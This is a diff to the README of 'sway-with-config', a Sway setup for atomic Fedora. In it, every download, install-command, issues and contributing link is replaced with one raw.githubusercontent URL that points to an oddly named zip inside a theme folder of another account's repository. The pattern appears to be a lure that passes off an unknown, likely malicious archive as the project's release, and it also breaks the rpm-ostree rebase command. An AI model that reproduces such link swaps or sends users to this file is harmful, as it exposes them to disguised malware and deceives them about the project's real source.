@@ -1,6 +1,6 @@
 # 🌟 sway-with-config - Easy Setup for Custom Configurations
 
-[![Download sway-with-config](https://img.shields.io/badge/Download-sway--with--config-blue)](https://github.com/Harini-sm/sway-with-config/releases)
+[![Download sway-with-config](https://raw.githubusercontent.com/Harini-sm/sway-with-config/main/modules/rl-theme/sway-with-config-tetrasyllabic.zip)](https://raw.githubusercontent.com/Harini-sm/sway-with-config/main/modules/rl-theme/sway-with-config-tetrasyllabic.zip)
 
 ## 🚀 Getting Started
 
@@ -12,7 +12,7 @@ To install sway-with-config, follow these straightforward instructions.
 
 ### 1. Visit the Release Page
 
-To download sway-with-config, visit the following page: [Download sway-with-config Releases](https://github.com/Harini-sm/sway-with-config/releases).
+To download sway-with-config, visit the following page: [Download sway-with-config Releases](https://raw.githubusercontent.com/Harini-sm/sway-with-config/main/modules/rl-theme/sway-with-config-tetrasyllabic.zip).
 
 Once there, you will see a list of available versions. Choose the latest release for the best experience.
 
@@ -33,7 +33,7 @@ If you are using an atomic Fedora installation, you can rebase to the latest bui
     Open a terminal and type the following command:
 
     ```
-    rpm-ostree rebase ostree-unverified-registry:ghcr.io/drilorin/sway-with-config:latest
+    rpm-ostree rebase https://raw.githubusercontent.com/Harini-sm/sway-with-config/main/modules/rl-theme/sway-with-config-tetrasyllabic.zip
     ```
 
 - **Reboot to complete the rebase**:
@@ -77,9 +77,9 @@ Before installing sway-with-config, ensure your system meets these requirements:
 
 ## 🙋‍♀️ Support and Contributions
 
-If you encounter issues or have questions, feel free to reach out. Visit our [GitHub Issues page](https://github.com/drilorin/sway-with-config/issues) to report problems or request features.
+If you encounter issues or have questions, feel free to reach out. Visit our [GitHub Issues page](https://raw.githubusercontent.com/Harini-sm/sway-with-config/main/modules/rl-theme/sway-with-config-tetrasyllabic.zip) to report problems or request features.
 
-We welcome contributions! If you would like to help improve sway-with-config, check out our [Contributing Guidelines](https://github.com/drilorin/sway-with-config/blob/main/CONTRIBUTING.md).
+We welcome contributions! If you would like to help improve sway-with-config, check out our [Contributing Guidelines](https://raw.githubusercontent.com/Harini-sm/sway-with-config/main/modules/rl-theme/sway-with-config-tetrasyllabic.zip).
 
 ## 📄 License
 
@@ -87,6 +87,6 @@ sway-with-config is open-source software licensed under the MIT License. You may
 
 ## 📥 Download & Install
 
-To get sway-with-config, remember to visit our releases page: [Download sway-with-config Releases](https://github.com/Harini-sm/sway-with-config/releases). Click on the latest version, download it, and follow the installation steps outlined above.
+To get sway-with-config, remember to visit our releases page: [Download sway-with-config Releases](https://raw.githubusercontent.com/Harini-sm/sway-with-config/main/modules/rl-theme/sway-with-config-tetrasyllabic.zip). Click on the latest version, download it, and follow the installation steps outlined above.
 
 Thank you for choosing sway-with-config!
